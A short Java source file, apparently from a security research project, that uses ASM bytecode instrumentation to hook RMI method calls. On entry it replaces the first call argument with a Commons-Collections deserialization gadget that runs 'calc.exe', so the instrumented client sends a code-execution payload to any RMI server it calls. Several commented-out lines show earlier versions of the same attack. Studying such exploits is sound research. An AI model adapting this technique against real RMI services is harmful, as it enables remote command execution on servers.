package teu.rasp.visitorAdapter;

import org.objectweb.asm.Label;
import org.objectweb.asm.MethodVisitor;
import org.objectweb.asm.Opcodes;
import org.objectweb.asm.commons.AdviceAdapter;

public class RMIInterceptorVisitorAdapter extends AdviceAdapter {
    public RMIInterceptorVisitorAdapter(MethodVisitor mv, int access, String name, String desc) {
        super(Opcodes.ASM5, mv, access, name, desc);
    }
    protected void onMethodEnter(){
        mv.visitVarInsn(ALOAD, 3);
        mv.visitInsn(ICONST_0);
//        mv.visitLdcInsn("altering RMI SPEAKING!");
        mv.visitLdcInsn("calc.exe");
        mv.visitMethodInsn(INVOKESTATIC, "teu/rasp/util/commonscollections5", "getObject", "(Ljava/lang/String;)Ljavax/management/BadAttributeValueExpException;", false);
        mv.visitInsn(AASTORE);
//        mv.visitVarInsn(ASTORE,3);

//        mv.visitInsn(ACONST_NULL);
//        mv.visitVarInsn(ASTORE, 4);
//        mv.visitVarInsn(ALOAD, 4);
//        mv.visitInsn(ICONST_0);
//        mv.visitLdcInsn("calc.exe");
//        mv.visitMethodInsn(INVOKESTATIC, "teu/rasp/util/commonscollections5", "getObject", "(Ljava/lang/String;)Ljavax/management/BadAttributeValueExpException;", false);
//        mv.visitInsn(AASTORE);
//        mv.visitVarInsn(ALOAD, 0);
//        mv.visitVarInsn(ALOAD, 1);
//        mv.visitVarInsn(ALOAD, 2);
//        mv.visitVarInsn(ALOAD, 4);
//        mv.visitMethodInsn(INVOKESPECIAL, "java/rmi/server/RemoteObjectInvocationHandler", "invokeRemoteMethod", "(Ljava/lang/Object;Ljava/lang/reflect/Method;[Ljava/lang/Object;)Ljava/lang/Object;", false);
//        mv.visitInsn(ARETURN);
//        mv.visitMaxs(4, 5);
//        mv.visitEnd();

//        mv.visitFieldInsn(GETSTATIC, "java/lang/System", "err", "Ljava/io/PrintStream;");
//        mv.visitLdcInsn("CALL println");
//        mv.visitMethodInsn(INVOKEVIRTUAL, "java/io/PrintStream", "println", "(Ljava/lang/String;)V", false);

//          mv.visitVarInsn(ALOAD,3); //第三个参数args[]弹出，进入到操作栈
//          mv.visitInsn(POP); //把操作栈里的args[]扔了

    }
}
